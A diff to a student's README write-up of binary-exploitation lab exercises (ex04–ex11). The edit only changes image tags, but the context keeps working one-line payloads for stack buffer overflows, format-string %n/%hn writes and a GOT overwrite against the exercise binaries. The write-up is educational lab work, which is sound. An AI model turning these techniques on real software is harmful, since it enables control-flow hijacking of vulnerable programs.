@@ -60,7 +60,7 @@ This is how I did it:
 
 This was pretty much the same as previous exercise. Only the buffer size was bigger.    
 The return address of the function overwrites the offset value as: `0x50 + 8 + 4 - 0x10 = 0x4C = dec(76)`  
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/04_done.png" width="1000" heigth="800"/>
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/04_done.png"/>
 - Command used: `python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./bin`
 
 ## ex05 
@@ -70,7 +70,7 @@ Create a format string that writes 64 characters followed by `deadbeef`, which r
 
 Command: `./bin $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")`
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/05_done.png" width="1000" heigth="800"/>
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/05_done.png"/>
 
 ## ex06
 
@@ -89,7 +89,7 @@ Then jump to `winner()` using the function address:
 -  `jump *0x08048864`
 
 #### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/06_done.png" width="1000" heigth="800"/>
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/06_done.png"/>
 
 ## ex07
 
@@ -101,13 +101,13 @@ When the address is displayed properly. Instead of reading by using `%x`, lets w
 With trial and error I got to the final result.
 
 #### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/07_done.png" width="1000" heigth="800"/>
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/07_done.png"/>
 
 ## ex08
 
 We do the same stuff we did on the previous task. Buffer size is bigger and also the target value is in hex (`0x080484a2 <+59>:	cmp    $0x1025544,%eax`).
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_info.png" width="1000" heigth="800"/>   
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_info.png"/>   
 
 After getting this information I converted the hex value to decimal and got close enough to the needed value and did a small trial by error. 
 
@@ -115,7 +115,7 @@ After getting this information I converted the hex value to decimal and got clos
 `python -c "print '\xf4\x96\x04\x08' + '%x'*10 + '%16930052x' + '%n'" | ./bin`  
 
 Sadly solution breaks the terminal, so I couldn't include it in the previous pictures:    
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_done.png" width="1000" heigth="800"/>   
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_done.png"/>   
 
 ## ex09 
 
@@ -124,10 +124,10 @@ We are going to redirect the execution flow by overwriting the entry for the exi
 After finding the addresses of `hello()` and `exit()`, we need to get the print value of `hello()`.     
 Then we need to overwrite last to bytes of the exit address using this command: `python -c 'print "\x24\x97\x04\x08"+"%33968x%4$hn"' | ./bin`
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_info.png" width="1000" heigth="800"/>
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_info.png"/>
 
 ### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_info.png" width="1000" heigth="800">    
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_done.png">    
 
 This solution has terminal spam again but I used the same commands.
 
@@ -140,7 +140,7 @@ and where the `nowinner()` function starts from. We can calculate total bytes ne
 My map had `72` bytes between start and end so final command to pass the exercise is:   
 `./bin $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")`    
 <img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_info.png" width="1000" heigth="1000">   
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_done.png" width="1000" heigth="800">   
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_done.png">   
 
 ## ex11 
 
